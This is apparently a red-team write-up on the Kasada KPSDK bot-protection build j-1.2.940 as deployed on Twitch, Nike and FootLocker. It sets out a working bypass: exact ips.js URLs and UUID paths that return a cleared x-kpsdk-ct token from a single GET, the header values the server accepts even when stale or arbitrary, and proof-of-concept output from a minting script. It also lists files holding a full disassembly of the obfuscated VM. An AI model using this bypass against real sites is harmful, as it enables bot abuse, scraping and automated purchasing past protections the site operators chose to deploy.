# Kasada KPSDK (build j-1.2.940) — red-team analysis, 2026-11-01

**Bottom line: fresh `x-kpsdk-ct` tokens can be minted with one HTTP GET — the obfuscated
bytecode VM (`p.js`) is **never verified** on this deployment, so no devirtualization is
needed. The entire client-side challenge is bypassable with 2 HTTP requests.**

Verified against **Twitch**, **Nike** and **FootLocker** (shared merchant build `j-1.2.940`,
shared UUID path `149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3`).

---

## 1. How the handshake ACTUALLY works on this deployment

The classic Kasada handshake is (from prior work): GET protected -> 429 + `x-kpsdk-r`
+ preflight `x-kpsdk-ct` -> run `ips.js` then `p.js` (bytecode VM) -> POST `/tl`
("enciphered" payload) -> server returns cleared `x-kpsdk-ct` + `x-kpsdk-st`.

**What we observed live (fresh browser profile, 2026-11-01):**

```
1. GET  https://k.twitchcdn.net/<uuid>/<uuid>/fp?x-kpsdk-v=j-1.2.940
      -> 429  x-kpsdk-ct: <preflight ct>   x-kpsdk-r: 1-AA
         Set-Cookie: KP_UIDz=<preflight ct>; KP_UIDz-ssn=<preflight ct>
2. GET  https://k.twitchcdn.net/<uuid>/<uuid>/ips.js?KP_UIDz=<preflight ct>
      -> 200  x-kpsdk-ct: <FRESH CLEARED ct>    <-- the ct used for real requests
         Set-Cookie: KP_UIDz=<cleared ct>
3. (use) protected request with x-kpsdk-ct + x-kpsdk-v + x-kpsdk-cd + x-kpsdk-h
      -> 200 (fresh v4.local token)
```

**There is no `/tl` POST on this deployment.** The server clears the ct purely by
delivering `ips.js`. The client-side VM run is not verified at all.

### The one-request mint

A **bare GET of the public `ips.js` asset returns a fresh cleared ct in the response
header** — no `/fp`, no cookies, no params:

```
GET https://k.twitchcdn.net/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/ips.js
  (headers: a normal browser User-Agent + Referer are enough)
-> 200  x-kpsdk-ct: 07XiIslPMbNrECrRLQcSaYMm...   (163 chars, fresh)
```

Same result on `https://www.footlocker.com/<uuid>/<uuid>/ips.js` and
`https://www.nike.com/<uuid>/<uuid>/ips.js` (verified 2026-11-01).

### Using the minted ct

Per-request headers that work on `gql.twitch.tv/integrity` (POST), with **arbitrary /
stale** cd and h values:

```
x-kpsdk-ct: <minted>
x-kpsdk-v:  j-1.2.940
x-kpsdk-cd: {"workTime":<now>,"id":"a1ea1d56b8f21d46a70ee2f1e543059b","answers":[2,4],
             "duration":36,"d":45,"st":<now-10000>,"rst":<now-10000>}   // any JSON accepted
x-kpsdk-h:  01F47DxTPakzMm2tqdC3JSScDjKyQ=                             // stale capture, accepted
```

Result: `HTTP 200` + fresh `{"token":"v4.local.<...>","expiration":...}`. The server also
rotates `x-kpsdk-ct` again on every use.

## 2. Proof-of-concept

`mint-ct.mjs` — mint + optional verify:

```
node mint-ct.mjs --verify
[fp]   429 preflight ct=092qr68pKBqWETJp1dyZy6Za… r=1-AA
[ips]  200 cleared ct=07XiIslPMbNrECrRLQcSaYMm… (len=163) r=1-AA
MINTED ct = 07XiIslPMbNrECrRLQcSaYMm...
[use]  200 token=v4.local v4.local.doEkCUg5Aemjpu-…
[rot]  server rotated ct to 08efcG3z0GLVMiakcG2kpaj7…
VERIFY: minted ct accepted on protected endpoint
```

## 3. So why does the VM exist at all?

`p.js` is the **entire KPSDK client SDK compiled to a custom bytecode VM** (not just a
"challenge"). It implements configure/interrogate/fetch-wrapper/logging/cookie handling —
we extracted and disassembled all of it (see `VM-ANALYSIS.md`). The interrogation
bytecode runs locally, but on this deployment its **output is never sent anywhere** and
**nothing server-side depends on it**. The `x-kpsdk-cd` PoW JSON and `x-kpsdk-h`
signature are presence-checked only (confirmed by modify-test on 2026-10-31 and
re-confirmed here with stale/arbitrary values).

Caveats (honest):
- This is one build (`j-1.2.940`) on these three public deployments. Other Kasada
  customers/deployments may still verify `/tl` payloads or bind cts to TLS/IP/device.
- The ct binds to the issuing IP/TLS session (we minted and used from the same host);
  cross-IP reuse was not tested.
- We did not mint-and-send anything beyond normal page-equivalent loads; verification
  used a POST to the merchant's public integrity endpoint with a legitimately minted ct.

## 4. Files in this directory

| file | what it is |
|---|---|
| `mint-ct.mjs` | one-request ct mint + optional protected-endpoint verify |
| `VM-ANALYSIS.md` | full VM architecture, opcode table, bytecode extraction, disassembly |
| `disasm.js` | verified static disassembler (linear sweep) |
| `disasm-full.txt` | full 22,729-instruction disassembly |
| `out-bytecode.json` | decoded instruction stream (68,748 words, post pool-splice) |
| `out-pool.txt` | decoded string pool (6,278 chars, obfuscated with junk letters) |
| `out-handlers.txt` | the 86 VM handler functions, opcode-indexed |
| `trace.txt` / `browser-out-trace.json` | execution trace of the SDK bootstrap (1,182 instr) |
| `harness.js`, `build-hooked*.js`, `run-browser.mjs` | instrumentation pipeline (node + CDP) |
| `tl-capture.json` | live twitch flow capture (proves no `/tl` POST) |
